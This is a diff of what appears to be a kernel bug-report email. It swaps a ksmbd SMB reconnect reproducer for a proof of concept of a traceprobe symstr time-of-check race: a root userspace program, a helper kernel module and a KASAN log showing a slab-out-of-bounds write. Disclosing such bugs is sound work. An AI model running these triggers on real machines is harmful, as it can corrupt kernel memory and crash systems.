-			    !memcmp(rbuf + i, "DHnQ", 4) || !memcmp(rbuf + i, "DH2Q", 4))
-				fprintf(stderr, "  tag at %d: %.4s\n", i, rbuf + i);
-		}
-		/* ContextsLength at create_rsp offset 148 (from smb2 hdr =3D rbuf+4) */
-		if (rn >=3D 4 + 152) {
-			uint32_t ctx_off =3D *(uint32_t *)(rbuf + 4 + 140);
-			uint32_t ctx_len =3D *(uint32_t *)(rbuf + 4 + 144);
-			fprintf(stderr, "  CreateContextsOffset=3D%u Length=3D%u (total_pdu=3D%zd)=
-\n",
-				ctx_off, ctx_len, rn - 4);
-		}
-	}
-
-	if (rn >=3D 4 + 144 && *(uint32_t *)(rbuf + 12) =3D=3D 0) {
-		uint64_t persistent =3D *(uint64_t *)(rbuf + 4 + 128);
-		uint64_t volatile_id =3D *(uint64_t *)(rbuf + 4 + 136);
-		fprintf(stderr, "[FIRST OPEN] persistent=3D%llu volatile=3D%llu\n",
-			(unsigned long long)persistent,
-			(unsigned long long)volatile_id);
-		close(fd);
-		usleep(600000);
-		fd =3D reconnect_guest();
-		if (fd < 0) return 2;
-		n =3D build_create_reconnect(buf, persistent, volatile_id);
-		smb_send(fd, buf, n);
-		rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-		fprintf(stderr, "[RECONNECT REPLY] len=3D%zd status=3D0x%08x\n", rn,
-			rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-	}
-
-	fprintf(stderr, "=3D=3D=3D ksmbd_aapl_ctrl done =3D=3D=3D\n");
-	ipc_running =3D 0;
-	pthread_join(tid, NULL);
+	if (fd < 0)
+		die("read event id");
+	n =3D read(fd, buf, sizeof(buf) - 1);
+	if (n <=3D 0)
+		die("read event id");
 	close(fd);
+	buf[n] =3D '\0';
+	return atoi(buf);
+}
+
+int main(int argc, char **argv)
+{
+	char command[4096] =3D "p:symrace/test symrace_probe_point";
+	char path[256];
+	struct perf_event_attr attr =3D { 0 };
+	int fds[256], nfds =3D 0;
+	int ncpu =3D sysconf(_SC_NPROCESSORS_CONF);
+
+	if (geteuid()) {
+		fprintf(stderr, "run as root\n");
+		return 1;
+	}
+	(void)mkdir(TRACEFS, 0755);
+	if (access(TRACEFS "/kprobe_events", F_OK) &&
+	    mount("tracefs", TRACEFS, "tracefs", 0, NULL) && errno !=3D EBUSY)
+		die("mount tracefs");
+
+	for (int i =3D 0; i < NR_FIELDS; i++) {
+		char field[64];
+		snprintf(field, sizeof(field), " f%d=3D+0($arg1):symstr", i);
+		if (strlen(command) + strlen(field) >=3D sizeof(command)) {
+			fprintf(stderr, "probe command too long\n");
+			return 1;
+		}
+		strcat(command, field);
+	}
+	strcat(command, "\n");
+
+	write_text(TRACEFS "/kprobe_events", command);
+	write_text(TRACEFS "/buffer_size_kb", "1\n");
+	write_text(TRACEFS "/events/symrace/test/enable", "1\n");
+
+	attr.type =3D PERF_TYPE_TRACEPOINT;
+	attr.size =3D sizeof(attr);
+	attr.config =3D read_id();
+	attr.sample_period =3D 1;
+	attr.sample_type =3D PERF_SAMPLE_RAW;
+	attr.wakeup_events =3D 1;
+	for (int cpu =3D 0; cpu < ncpu && nfds < (int)(sizeof(fds) / sizeof(fds[0]))=
+; cpu++) {
+		int fd =3D syscall(__NR_perf_event_open, &attr, -1, cpu, -1, 0);
+		if (fd >=3D 0)
+			fds[nfds++] =3D fd;
+	}
+	if (!nfds)
+		die("perf_event_open");
+
+	write_text("/sys/module/helper/parameters/run", "1\n");
+	fprintf(stderr, "running %d symstr fields with %d perf fds\n",
+		NR_FIELDS, nfds);
+	sleep(argc > 1 ? atoi(argv[1]) : 120);
+	write_text("/sys/module/helper/parameters/run", "0\n");
+	for (int i =3D 0; i < nfds; i++)
+		close(fds[i]);
 	return 0;
 }
 
---===============3053206820710942250==
+--===============5575217477510584208==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="helper.c"
+MIME-Version: 1.0
+
+// SPDX-License-Identifier: GPL-2.0
+#include <linux/atomic.h>
+#include <linux/delay.h>
+#include <linux/kthread.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+
+static unsigned long symbol_slot;
+static struct task_struct *toggle_task;
+static struct task_struct *trigger_task;
+static atomic_t run =3D ATOMIC_INIT(0);
+
+void symrace_probe_point(unsigned long *slot);
+
+static noinline __used void a(void)
+{
+	barrier();
+}
+
+static noinline __used void
+this_is_an_intentionally_very_long_symbol_name_used_to_make_the_symbol_string=
+_expand_between_the_traceprobe_size_and_store_passes_abcdefghijklmnopqrstuvwx=
+yz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrst=
+uvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnop=
+qrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijkl=
+mnopqrstuvwxyz(void)
+{
+	barrier();
+}
+
+noinline __used void symrace_probe_point(unsigned long *slot)
+{
+	barrier_data(slot);
+}
+
+static int toggle_fn(void *unused)
+{
+	unsigned long short_addr =3D (unsigned long)a;
+	unsigned long long_addr =3D (unsigned long)
+		this_is_an_intentionally_very_long_symbol_name_used_to_make_the_symbol_stri=
+ng_expand_between_the_traceprobe_size_and_store_passes_abcdefghijklmnopqrstuv=
+wxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqr=
+stuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmn=
+opqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghij=
+klmnopqrstuvwxyz;
+
+	while (!kthread_should_stop()) {
+		WRITE_ONCE(symbol_slot, short_addr);
+		cpu_relax();
+		WRITE_ONCE(symbol_slot, long_addr);
+		cpu_relax();
+		cond_resched();
+	}
+	return 0;
+}
+
+static int trigger_fn(void *unused)
+{
+	while (!kthread_should_stop()) {
+		if (!atomic_read(&run)) {
+			set_current_state(TASK_INTERRUPTIBLE);
+			schedule_timeout(HZ / 20 + 1);
+			continue;
+		}
+
+		for (unsigned int i =3D 0;
+		     i < 100000 && !kthread_should_stop(); i++)
+			symrace_probe_point(&symbol_slot);
+		cond_resched();
+	}
+	return 0;
+}
+
+static int param_set_run(const char *val, const struct kernel_param *kp)
+{
+	int value;
+	int ret =3D kstrtoint(val, 0, &value);
+
+	if (ret)
+		return ret;
+	atomic_set(&run, !!value);
+	return 0;
+}
+
+static int param_get_run(char *buf, const struct kernel_param *kp)
+{
+	return sysfs_emit(buf, "%d\n", atomic_read(&run));
+}
+
+static const struct kernel_param_ops run_ops =3D {
+	.set =3D param_set_run,
+	.get =3D param_get_run,
+};
+module_param_cb(run, &run_ops, NULL, 0644);
+
+static int __init helper_init(void)
+{
+	symbol_slot =3D (unsigned long)a;
+	toggle_task =3D kthread_run(toggle_fn, NULL, "symrace-toggle");
+	if (IS_ERR(toggle_task))
+		return PTR_ERR(toggle_task);
+
+	trigger_task =3D kthread_run(trigger_fn, NULL, "symrace-trigger");
+	if (IS_ERR(trigger_task)) {
+		kthread_stop(toggle_task);
+		return PTR_ERR(trigger_task);
+	}
+	return 0;
+}
+
+static void __exit helper_exit(void)
+{
+	atomic_set(&run, 0);
+	if (trigger_task)
+		kthread_stop(trigger_task);
+	if (toggle_task)
+		kthread_stop(toggle_task);
+}
+
+module_init(helper_init);
+module_exit(helper_exit);
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("traceprobe symstr size/store TOCTOU helper");
+
+--===============5575217477510584208==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="Makefile"
+MIME-Version: 1.0
+
+obj-m += helper.o
+
+--===============5575217477510584208==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="kasan-run1.txt"
 MIME-Version: 1.0
 
-[  106.410461] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
-[  106.495947] Read of size 1 at addr ffff88800e5142e5 by task kworker/0:0/9
-[  106.496146]=20
-[  106.496779] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
-EEMPT(lazy)=20
-[  106.496916] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  979.534893] BUG: KASAN: slab-out-of-bounds in sized_strscpy+0x248/0x2f0
+[  979.534957] Write of size 8 at addr ff1100000a215032 by task symrace-trigg=
+er/468
+[  979.534967]=20
+[  979.534995] CPU: 2 UID: 0 PID: 468 Comm: symrace-trigger Tainted: G       =
+ W  O        7.3.0 #1 PREEMPT(lazy)=20
+[  979.535019] Tainted: [W]=3DWARN, [O]=3DOOT_MODULE
+[  979.535025] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  106.497137] Workqueue: ksmbd-io handle_ksmbd_work
-[  106.497505] Call Trace:
-[  106.497601]  <TASK>
-[  106.497714]  dump_stack_lvl+0x7b/0xa0
-[  106.497862]  print_report+0xd0/0x630
-[  106.497962]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.498055]  ? string+0x42b/0x470
-[  106.498107]  kasan_report+0xce/0x100
-[  106.498171]  ? string+0x42b/0x470
-[  106.498231]  string+0x42b/0x470
-[  106.498285]  ? __pfx_string+0x10/0x10
-[  106.498347]  vsnprintf+0x330/0x1110
-[  106.498416]  ? __pfx_vsnprintf+0x10/0x10
-[  106.498474]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.498564]  vprintk_store+0x319/0x960
-[  106.498644]  ? stack_depot_save_flags+0x480/0x820
-[  106.498739]  ? __pfx_vprintk_store+0x10/0x10
-[  106.498799]  ? kasan_save_stack+0x42/0x60
-[  106.498871]  ? kasan_save_track+0x14/0x30
-[  106.498927]  ? smb2_set_info+0x1eff/0x3a50
-[  106.498995]  ? handle_ksmbd_work+0x6e4/0x1dd0
-[  106.499070]  ? process_one_work+0x755/0x1200
-[  106.499143]  ? worker_thread+0x4d3/0xbc0
-[  106.499204]  ? kthread+0x2fe/0x400
-[  106.499277]  ? printk_percpu_data_ready+0xe/0x20
-[  106.499340]  vprintk_emit+0xfc/0x3b0
-[  106.499407]  ? __pfx_vprintk_emit+0x10/0x10
-[  106.499481]  _printk+0xcc/0x100
-[  106.499574]  ? __pfx__printk+0x10/0x10
-[  106.499656]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.499710]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[  106.499784]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.499837]  smb2_set_ea+0x5a9/0x7f0
-[  106.499892]  ? smb2_set_info+0x160f/0x3a50
-[  106.499958]  smb2_set_info+0x1eff/0x3a50
-[  106.500025]  ? _raw_spin_lock+0x85/0xe0
-[  106.500098]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.500167]  ? ksmbd_smb2_check_message+0x531/0x2cd0
-[  106.500254]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.500317]  handle_ksmbd_work+0x6e4/0x1dd0
-[  106.500409]  process_one_work+0x755/0x1200
-[  106.500484]  ? __pfx_process_one_work+0x10/0x10
-[  106.500557]  ? __pfx_handle_ksmbd_work+0x10/0x10
-[  106.500639]  worker_thread+0x4d3/0xbc0
-[  106.500718]  ? __pfx_worker_thread+0x10/0x10
-[  106.500781]  kthread+0x2fe/0x400
-[  106.500834]  ? recalc_sigpending+0x18c/0x220
-[  106.500902]  ? __pfx_kthread+0x10/0x10
-[  106.500958]  ret_from_fork+0x3f7/0x680
-[  106.501031]  ? __pfx_ret_from_fork+0x10/0x10
-[  106.501094]  ? __switch_to+0x743/0xf60
-[  106.501173]  ? __pfx_kthread+0x10/0x10
-[  106.501230]  ret_from_fork_asm+0x1a/0x30
-[  106.501345]  </TASK>
-[  106.501424]=20
-[  106.501455] Allocated by task 101:
-[  106.501573]  kasan_save_stack+0x33/0x60
-[  106.501755]  kasan_save_track+0x14/0x30
-[  106.501806]  __kasan_kmalloc+0x8f/0xa0
-[  106.501855]  __kvmalloc_node_noprof+0x24a/0x670
-[  106.501932]  ksmbd_conn_handler_loop+0x530/0x1110
-[  106.502000]  kthread+0x2fe/0x400
-[  106.502047]  ret_from_fork+0x3f7/0x680
-[  106.502099]  ret_from_fork_asm+0x1a/0x30
-[  106.502174]=20
-[  106.502226] The buggy address belongs to the object at ffff88800e514200
-[  106.502226]  which belongs to the cache kmalloc-256 of size 256
-[  106.502307] The buggy address is located 0 bytes to the right of
-[  106.502307]  allocated 229-byte region [ffff88800e514200, ffff88800e5142e5)
-[  106.502366]=20
-[  106.502439] The buggy address belongs to the physical page:
-[  106.502793] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
- pfn:0xe514
-[  106.503088] flags: 0x100000000000000(node=3D0|zone=3D1)
-[  106.503570] page_type: f5(slab)
-[  106.503962] raw: 0100000000000000 ffff88800a041b40 dead000000000122 000000=
+[  979.535041] Call Trace:
+[  979.535055]  <TASK>
+[  979.535062]  dump_stack_lvl+0x7b/0xa0
+[  979.535086]  print_report+0xd0/0x630
+[  979.535131]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  979.535157]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535185]  ? sized_strscpy+0x248/0x2f0
+[  979.535204]  kasan_report+0xce/0x100
+[  979.535225]  ? sized_strscpy+0x248/0x2f0
+[  979.535247]  sized_strscpy+0x248/0x2f0
+[  979.535271]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.535305]  module_address_lookup+0xdc/0x130
+[  979.535341]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.535374]  kallsyms_lookup_buildid+0x157/0x1e0
+[  979.535401]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.535434]  __sprint_symbol.isra.0+0xd9/0x1f0
+[  979.535453]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[  979.535471]  ? __asan_memcpy+0x3c/0x60
+[  979.535485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535500]  ? __sprint_symbol.isra.0+0x151/0x1f0
+[  979.535519]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[  979.535540]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535555]  ? copy_from_kernel_nofault_allowed+0x98/0xd0
+[  979.535591]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.535625]  process_fetch_insn+0x8c2/0x1990
+[  979.535654]  ? __pfx_process_fetch_insn+0x10/0x10
+[  979.535670]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535685]  ? rb_move_tail+0x433/0x1830
+[  979.535713]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.535756]  ? __pfx_rb_move_tail+0x10/0x10
+[  979.535779]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535798]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535813]  ? sched_clock+0x29/0x50
+[  979.535831]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535847]  ? __rb_reserve_next.constprop.0+0x62d/0x1480
+[  979.535875]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535891]  ? ring_buffer_lock_reserve+0x56d/0xfa0
+[  979.535908]  ? __pfx_ring_buffer_lock_reserve+0x10/0x10
+[  979.535924]  ? __entry_text_end+0xfdff5/0x1020f9
+[  979.535942]  ? handle_bug+0x184/0x2a0
+[  979.535962]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.535978]  ? ring_buffer_event_data+0xc9/0x120
+[  979.535997]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.536012]  ? trace_event_buffer_lock_reserve+0x3f3/0x6d0
+[  979.536035]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.536051]  ? ring_buffer_event_data+0xc9/0x120
+[  979.536070]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.536085]  ? trace_event_buffer_reserve+0x250/0x320
+[  979.536103]  kprobe_trace_func+0x3a6/0x700
+[  979.536123]  ? __pfx_kprobe_trace_func+0x10/0x10
+[  979.536142]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.536158]  ? preempt_schedule_notrace+0x4b/0x80
+[  979.536180]  kprobe_dispatcher+0xf0/0x120
+[  979.536196]  ? symrace_probe_point+0x4/0x20 [helper]
+[  979.536212]  kprobe_ftrace_handler+0x2bf/0x420
+[  979.536230]  ? symrace_probe_point+0x9/0x20 [helper]
+[  979.536245]  ? __pfx_kprobe_dispatcher+0x10/0x10
+[  979.536262]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[  979.536277]  0xffffffffa04010da
+[  979.536293]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[  979.536311]  ? trigger_fn+0x95/0xe0 [helper]
+[  979.536326]  ? symrace_probe_point+0x5/0x20 [helper]
+[  979.536343]  symrace_probe_point+0x9/0x20 [helper]
+[  979.536358]  trigger_fn+0xa1/0xe0 [helper]
+[  979.536374]  kthread+0x2fe/0x400
+[  979.536394]  ? recalc_sigpending+0x18c/0x220
+[  979.536412]  ? __pfx_kthread+0x10/0x10
+[  979.536426]  ret_from_fork+0x3f7/0x680
+[  979.536444]  ? __pfx_ret_from_fork+0x10/0x10
+[  979.536460]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.536476]  ? __switch_to+0x743/0xf60
+[  979.536502]  ? __pfx_kthread+0x10/0x10
+[  979.536516]  ret_from_fork_asm+0x1a/0x30
+[  979.536540]  </TASK>
+[  979.536546]=20
+[  979.536549] Allocated by task 362:
+[  979.536562]  kasan_save_stack+0x33/0x60
+[  979.536580]  kasan_save_track+0x14/0x30
+[  979.536596]  __kasan_kmalloc+0x8f/0xa0
+[  979.536610]  __kmalloc_noprof+0x1e9/0x510
+[  979.536628]  __memcg_list_lru_alloc+0x395/0x690
+[  979.536649]  memcg_list_lru_alloc+0xc0/0xf0
+[  979.536666]  __memcg_slab_post_alloc_hook+0x1fe/0x11b0
+[  979.536688]  kmem_cache_alloc_lru_noprof+0x3a5/0x3e0
+[  979.536701]  __d_alloc+0x3a/0x850
+[  979.536724]  d_alloc_pseudo+0x21/0xb0
+[  979.536743]  alloc_file_pseudo+0x101/0x270
+[  979.536768]  __anon_inode_getfile+0xbd/0x230
+[  979.536804]  __anon_inode_getfd+0x57/0xc0
+[  979.536819]  do_inotify_init+0x465/0x5c0
+[  979.536842]  __x64_sys_inotify_init1+0x35/0x50
+[  979.536862]  do_syscall_64+0xdd/0x4a0
+[  979.536876]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  979.536888]=20
+[  979.536890] The buggy address belongs to the object at ff1100000a215000
+[  979.536890]  which belongs to the cache kmalloc-64 of size 64
+[  979.536903] The buggy address is located 2 bytes to the right of
+[  979.536903]  allocated 48-byte region [ff1100000a215000, ff1100000a215030)
+[  979.536915]=20
+[  979.536918] The buggy address belongs to the physical page:
+[  979.536929] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xf=
+f1100000a215c80 pfn:0xa215
+[  979.536946] flags: 0x100000000000200(workingset|node=3D0|zone=3D1)
+[  979.536964] page_type: f5(slab)
+[  979.536976] raw: 0100000000000200 ff110000098388c0 ffd40000003fbe90 ffd400=
+00002af310
+[  979.536988] raw: ff1100000a215c80 000000000020001f 00000000f5000000 000000=
 0000000000
-[  106.504034] raw: 0000000000000000 0000000000080008 00000000f5000000 000000=
-0000000000
-[  106.504129] page dumped because: kasan: bad access detected
-[  106.504162]=20
-[  106.504180] Memory state around the buggy address:
-[  106.504439]  ffff88800e514180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
-c fc
-[  106.504514]  ffff88800e514200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[  979.536996] page dumped because: kasan: bad access detected
+[  979.537001]=20
+[  979.537004] Memory state around the buggy address:
+[  979.537009]  ff1100000a214f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[  106.504572] >ffff88800e514280: 00 00 00 00 00 00 00 00 00 00 00 00 05 fc f=
+[  979.537018]  ff1100000a214f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+0 00
+[  979.537027] >ff1100000a215000: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc f=
 c fc
-[  106.504618]                                                        ^
-[  106.504695]  ffff88800e514300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  979.537035]                                      ^
+[  979.537041]  ff1100000a215080: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc f=
 c fc
-[  106.504734]  ffff88800e514380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  979.537050]  ff1100000a215100: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc f=
 c fc
-[  106.504785] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+[  979.537057] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-[  106.505129] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  106.521844] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
-EEMPT(lazy)=20
-[  106.522250] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  979.537101] Disabling lock debugging due to kernel taint
+[  979.537106] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+[  979.537111] BUG: KASAN: slab-out-of-bounds in sized_strscpy+0x248/0x2f0
+[  979.537132] Write of size 8 at addr ff1100000a21503a by task symrace-trigg=
+er/468
+[  979.537142]=20
+[  979.537148] CPU: 2 UID: 0 PID: 468 Comm: symrace-trigger Tainted: G    B  =
+ W  O        7.3.0 #1 PREEMPT(lazy)=20
+[  979.537168] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN, [O]=3DOOT_MODULE
+[  979.537175] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  106.522716] Workqueue: ksmbd-io handle_ksmbd_work
-[  106.523048] Call Trace:
-[  106.523205]  <TASK>
-[  106.523349]  dump_stack_lvl+0x30/0xa0
-[  106.523613]  vpanic+0x790/0x850
-[  106.523859]  ? __pfx_vpanic+0x10/0x10
-[  106.524105]  ? string+0x42b/0x470
-[  106.524313]  panic+0xcf/0xd0
-[  106.524532]  ? __pfx_panic+0x10/0x10
-[  106.524771]  ? print_report+0x2ef/0x630
-[  106.525008]  check_panic_on_warn+0x91/0xa0
-[  106.525257]  end_report+0xc8/0xe0
-[  106.525471]  kasan_report+0xdc/0x100
-[  106.525708]  ? string+0x42b/0x470
-[  106.525926]  string+0x42b/0x470
-[  106.526131]  ? __pfx_string+0x10/0x10
-[  106.526360]  vsnprintf+0x330/0x1110
-[  106.526595]  ? __pfx_vsnprintf+0x10/0x10
-[  106.526832]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.527124]  vprintk_store+0x319/0x960
-[  106.527350]  ? stack_depot_save_flags+0x480/0x820
-[  106.527638]  ? __pfx_vprintk_store+0x10/0x10
-[  106.527885]  ? kasan_save_stack+0x42/0x60
-[  106.528114]  ? kasan_save_track+0x14/0x30
-[  106.528343]  ? smb2_set_info+0x1eff/0x3a50
-[  106.528593]  ? handle_ksmbd_work+0x6e4/0x1dd0
-[  106.528858]  ? process_one_work+0x755/0x1200
-[  106.529101]  ? worker_thread+0x4d3/0xbc0
-[  106.529330]  ? kthread+0x2fe/0x400
-[  106.529567]  ? printk_percpu_data_ready+0xe/0x20
-[  106.529828]  vprintk_emit+0xfc/0x3b0
-[  106.530056]  ? __pfx_vprintk_emit+0x10/0x10
-[  106.530309]  _printk+0xcc/0x100
-[  106.530547]  ? __pfx__printk+0x10/0x10
-[  106.530798]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.531026]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[  106.531296]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.531528]  smb2_set_ea+0x5a9/0x7f0
-[  106.531746]  ? smb2_set_info+0x160f/0x3a50
-[  106.531990]  smb2_set_info+0x1eff/0x3a50
-[  106.532229]  ? _raw_spin_lock+0x85/0xe0
-[  106.532475]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.532745]  ? ksmbd_smb2_check_message+0x531/0x2cd0
-[  106.533058]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.533315]  handle_ksmbd_work+0x6e4/0x1dd0
-[  106.533604]  process_one_work+0x755/0x1200
-[  106.533865]  ? __pfx_process_one_work+0x10/0x10
-[  106.534132]  ? __pfx_handle_ksmbd_work+0x10/0x10
-[  106.534415]  worker_thread+0x4d3/0xbc0
-[  106.534676]  ? __pfx_worker_thread+0x10/0x10
-[  106.534934]  kthread+0x2fe/0x400
-[  106.535200]  ? recalc_sigpending+0x18c/0x220
-[  106.535528]  ? __pfx_kthread+0x10/0x10
-[  106.535762]  ret_from_fork+0x3f7/0x680
-[  106.535998]  ? __pfx_ret_from_fork+0x10/0x10
-[  106.536252]  ? __switch_to+0x743/0xf60
-[  106.536515]  ? __pfx_kthread+0x10/0x10
-[  106.536751]  ret_from_fork_asm+0x1a/0x30
-[  106.537014]  </TASK>
-[  106.537794] Kernel Offset: disabled
-[  106.538562] Rebooting in 1 seconds..
+[  979.537184] Call Trace:
+[  979.537188]  <TASK>
+[  979.537193]  dump_stack_lvl+0x7b/0xa0
+[  979.537212]  print_report+0xd0/0x630
+[  979.537229]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  979.537253]  ? sized_strscpy+0x248/0x2f0
+[  979.537271]  kasan_report+0xce/0x100
+[  979.537289]  ? sized_strscpy+0x248/0x2f0
+[  979.537311]  sized_strscpy+0x248/0x2f0
+[  979.537331]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
